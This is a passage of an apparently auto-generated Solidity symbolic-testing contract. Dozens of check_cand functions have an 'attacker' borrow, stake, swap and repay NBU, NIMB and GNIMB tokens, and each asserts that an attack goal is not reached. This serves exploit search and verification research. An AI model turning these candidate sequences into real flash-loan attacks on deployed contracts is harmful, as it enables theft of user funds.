        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand700(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand701(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand702(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand703(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand704(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand705(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand706(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand707(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand708(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand709(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand710(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand711(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand712(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand713(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand714(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand715(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand716(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand717(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand718(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand719(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand720(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbugnimb_gnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand721(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand722(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand723(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand724(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand725(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand726(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand727(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand728(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand729(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand730(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand731(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand732(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand733(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand734(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand735(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand736(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand737(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand738(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand739(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand740(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand741(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand742(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand743(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand744(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand745(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand746(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand747(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand748(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand749(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand750(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand751(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand752(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand753(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand754(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
